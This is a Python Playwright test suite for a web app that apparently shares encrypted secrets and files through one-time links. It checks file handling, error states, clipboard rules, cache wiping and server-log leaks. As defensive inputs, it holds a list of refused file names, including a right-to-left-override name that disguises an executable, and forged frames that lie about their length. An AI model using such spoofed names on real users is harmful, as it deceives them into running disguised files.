async def b_text_with_a_nul_or_in_another_encoding_counts_as_binary(browser, server):
    for content in [b"abc\x00def", b"PASSWORD=caf\xe9\n"]:
        rid, secret, link = server.create(content, name="x.txt")
        async with Page(browser, server) as p:
            name, data = await read_binary(p, link, "x.txt")
        assert (name, data) == ("x.txt", content), content


async def b_a_binary_file_with_a_name_that_would_run_is_saved_as_bin(browser, server):
    rid, secret, link = server.create(BINARY, name="run.exe")
    async with Page(browser, server) as p:
        name, data = await read_binary(p, link, "run.exe")
        assert await visible(p.page, "#hint-bin")
        assert not await visible(p.page, "#hint-txt")
    assert name == "run.exe.bin", name
    assert data == BINARY
    # With no name it gets a plain one, and .bin is not added twice.
    rid, secret, link = server.create(BINARY)
    async with Page(browser, server) as p:
        name, data = await read_binary(p, link, "no name")
        assert not await visible(p.page, "#hint-bin")
    assert name == "apikeybin.bin", name
    rid, secret, link = server.create(BINARY, name="a.bin")
    async with Page(browser, server) as p:
        name, _ = await read_binary(p, link, "a.bin")
    assert name == "a.bin", name


async def b_a_file_whose_name_cannot_be_sent_is_refused_when_chosen(browser, server):
    # The sender finds out here. Otherwise it is the reader who finds out, after the link is used.
    refused = [
        "a" + chr(0x202e) + "gpj.exe",
        "a" + chr(0x200b) + "b",
        "a" + chr(1) + "b",
        "a.html.",
        "a.exe ",
        " a",
        "a:b",
        "x" * 129,
        "あ" * 43,  # 129 bytes in 43 characters: the limit is on what goes in the frame
    ]
    with tempfile.TemporaryDirectory() as tmp:
        for name in refused:
            path = env_file(tmp, name)
            async with Page(browser, server) as p:
                await p.page.goto(server.base + "/")
                await p.page.set_input_files("#file", str(path))
                await wait_visible(p.page, "#err-name")
                assert not await visible(p.page, "#file-chip"), repr(name)
                assert p.posts() == [], repr(name)
        # The same way of choosing a file works when the name is fine, right up to the limit.
        for name in ["x" * 128, "あ" * 42]:
            path = env_file(tmp, name)
            async with Page(browser, server) as p:
                await p.page.goto(server.base + "/")
                await p.page.set_input_files("#file", str(path))
                await wait_visible(p.page, "#file-chip")
                assert await text_of(p.page, "#file-name") == name
                assert not await visible(p.page, "#err-name")


async def b_the_chosen_file_is_gone_once_the_link_is_made(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp)
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            await p.page.click("#again")
            await wait_visible(p.page, "#text")
            assert not await visible(p.page, "#file-chip")
            assert await p.page.evaluate("document.getElementById('file').files.length") == 0
            assert await text_of(p.page, "#file-name") == ""
            # Making another link now sends nothing, rather than the same file again.
            before = len(p.posts())
            await p.page.click("#make")
            await wait_visible(p.page, "#err-empty")
            assert len(p.posts()) == before


async def b_a_frame_that_lies_about_its_name_is_refused(browser, server):
    # What a modified sender can write: a name longer than the frame, or too short to hold a length.
    # 100 is within the limit on names, so only the length of the frame stops that one.
    for body in [(100).to_bytes(2, "big") + b"abc", (200).to_bytes(2, "big") + b"abc", b"\x00"]:
        padded = len(body).to_bytes(4, "big") + body
        padded += b"\0" * (1024 - len(padded))
        sealed, secret = seal(b"x", padded=padded)
        status, _, out = server.post("/api/s", sealed)
        assert status == 201
        rid = json.loads(out)["id"]
        async with Page(browser, server) as p:
            await p.page.goto(f"{server.base}/s/{rid}#1.{b64u(secret)}")
            await p.page.click("#open")
            await wait_visible(p.page, "#state-error")
            assert await text_of(p.page, "#output") == "", repr(body)


async def b_a_record_of_no_known_size_is_refused(browser, server):
    # The server refuses to store these, so this is what a dishonest or broken server could send.
    data = frame(None, b"x")
    padded = len(data).to_bytes(4, "big") + data
    padded += b"\0" * (2000 - len(padded))
    sealed, secret = seal(b"x", padded=padded)
    reply = json.dumps({"v": 1, "iv": sealed["iv"], "ct": sealed["ct"], "pw": False})

    async def answer(route):
        await route.fulfill(status=200, content_type="application/json", body=reply)

    async with Page(browser, server) as p:
        await p.page.route("**/api/s/*/open", answer)
        await p.page.goto(f"{server.base}/s/{'A' * 22}#1.{b64u(secret)}")
        await p.page.click("#open")
        await wait_visible(p.page, "#state-error")
        assert await text_of(p.page, "#output") == ""


def refusing(status):
    async def refuse(route):
        await route.fulfill(status=status, content_type="application/json", body='{"error":"x"}')
    return refuse


async def b_each_refusal_from_the_server_says_what_happened(browser, server):
    for status, expected in [(429, "#err-slow"), (507, "#err-full"), (500, "#err-net")]:
        async with Page(browser, server) as p:
            await p.page.route("**/api/s", refusing(status))
            await p.page.goto(server.base + "/")
            await p.page.fill("#text", "KEY=x")
            await p.page.click("#make")
            await wait_visible(p.page, expected)
            # No link appears, and what was typed is still there to try again.
            assert not await visible(p.page, "#result"), status
            assert await text_of(p.page, "#link") == "", status
            assert await p.page.input_value("#text") == "KEY=x", status


async def b_a_chosen_file_can_be_removed_and_leaves_nothing(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp)
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            await p.page.click("#clear-file")
            assert not await visible(p.page, "#file-chip")
            await wait_visible(p.page, "#text")
            await p.page.click("#make")
            await wait_visible(p.page, "#err-empty")
            assert p.posts() == []


async def b_a_passphrase_works_with_a_file(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp, "service-account.json", b'{"key":"sk_live_CANARY"}')
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            await p.page.fill("#passphrase", PASS)
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            link = await text_of(p.page, "#link")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.fill("#read-passphrase", PASS)
        await p.page.click("#open")
        await wait_visible(p.page, "#output", timeout=30000)
        assert await text_of(p.page, "#output-name") == "service-account.json"
        assert await text_of(p.page, "#output") == '{"key":"sk_live_CANARY"}'


async def b_outside_production_there_is_no_trip_through_another_site(browser, server):
    rid, secret, link = server.create("x")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await wait_visible(p.page, "#open")
        assert p.foreign() == []
        assert await p.page.evaluate("sessionStorage.length") == 0
        await p.page.goto(server.base + "/open")
        await wait_visible(p.page, "#state-nopending")


TESTS = [v for k, v in sorted(globals().items()) if k.startswith("b_")]


async def chromium_only_drop(browser, server):
    """Only one engine needs to prove the wiring of the drop handler."""
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        transfer = await p.page.evaluate_handle(
            "() => { const d = new DataTransfer(); d.items.add(new File(['KEY=sk_live_CANARY'], '.env')); return d; }"
        )
        await p.page.dispatch_event("#create", "drop", {"dataTransfer": transfer})
        await wait_visible(p.page, "#file-chip")
        assert await text_of(p.page, "#file-name") == ".env"
        await p.page.click("#make")
        await wait_visible(p.page, "#result")
        rid, _, secret = parse_link(await text_of(p.page, "#link"))
    assert unseal_named(json.loads(server.open(rid, secret)[2]), secret) == (".env", b"KEY=sk_live_CANARY")
    # The same rule as choosing it: a file that is not text is refused, for now.
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        transfer = await p.page.evaluate_handle(
            "() => { const d = new DataTransfer(); d.items.add(new File([new Uint8Array([0, 1, 2])], 'cert.p12')); return d; }"
        )
        await p.page.dispatch_event("#create", "drop", {"dataTransfer": transfer})
        await wait_visible(p.page, "#err-binary")
        assert not await visible(p.page, "#file-chip")


async def chromium_only_copy(browser, server):
    """Only Chromium lets a test grant clipboard access. The label shows the write succeeded."""
    async with Page(browser, server, permissions=["clipboard-write"]) as p:
        await p.page.goto(server.base + "/")
        await p.page.fill("#text", "x")
        await p.page.click("#make")
        await wait_visible(p.page, "#result")
        await p.page.click("#copy-link")
        await wait_visible(p.page, "#copied-link")
        reading = await p.page.evaluate(
            "async () => { try { await navigator.clipboard.readText(); return 'read'; } catch (e) { return 'refused'; } }"
        )
        assert reading == "refused", "the page may read the clipboard"


async def chromium_back_forward_cache(pw, server):
    """Back must not bring typed text back, with Playwright's own switch for this cache removed.
    This does NOT prove the wipe on leaving works: under this harness the page did not actually
    come back from the cache, so removing the wipe still passes. See mutate_web.py."""
    browser = await pw.chromium.launch(headless=True, ignore_default_args=["--disable-back-forward-cache"])
    try:
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.evaluate("window.__sameDocument = true")
            await p.page.fill("#text", SECRET_TEXT)
            await p.page.fill("#passphrase", PASS)
            await p.page.goto(server.base + "/robots.txt")
            await p.page.go_back()
            await p.page.wait_for_timeout(500)
            restored = await p.page.evaluate("window.__sameDocument === true")
            assert await p.page.input_value("#text") == "", f"secret came back (from the cache: {restored})"
            assert await p.page.input_value("#passphrase") == "", "passphrase came back"
    finally:
        await browser.close()


async def main():
    engines = (os.environ.get("BROWSERS") or "chromium,webkit,firefox").split(",")
    only = os.environ.get("ONLY", "")
    failed = []
    passed = 0
    with Server() as server:
        async with async_playwright() as pw:
            for name in engines:
                browser = await getattr(pw, name).launch(headless=True)
                print(f"== {name} {browser.version}", flush=True)
                tests = list(TESTS) + ([chromium_only_copy, chromium_only_drop] if name == "chromium" else [])
                for fn in tests:
                    if only and only not in fn.__name__:
                        continue
                    try:
                        await asyncio.wait_for(fn(browser, server), timeout=120)
                        passed += 1
                        print(f"ok   {fn.__name__}", flush=True)
                    except Exception as e:  # noqa: BLE001
                        failed.append(f"{name}:{fn.__name__}")
                        print(f"FAIL {fn.__name__}: {type(e).__name__}: {str(e)[:400]}", flush=True)
                await browser.close()
                if name == "chromium" and not only:
                    try:
                        await asyncio.wait_for(chromium_back_forward_cache(pw, server), timeout=60)
                        passed += 1
                        print("ok   chromium_back_forward_cache", flush=True)
                    except Exception as e:  # noqa: BLE001
                        failed.append("chromium_back_forward_cache")
                        print(f"FAIL chromium_back_forward_cache: {type(e).__name__}: {str(e)[:300]}", flush=True)
        logs = server.logs()
        if "sk_live_CANARY" in logs:
            failed.append("server_log_contains_secret")
    print(f"\nbrowser: {passed} passed, {len(failed)} failed {failed}", flush=True)
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
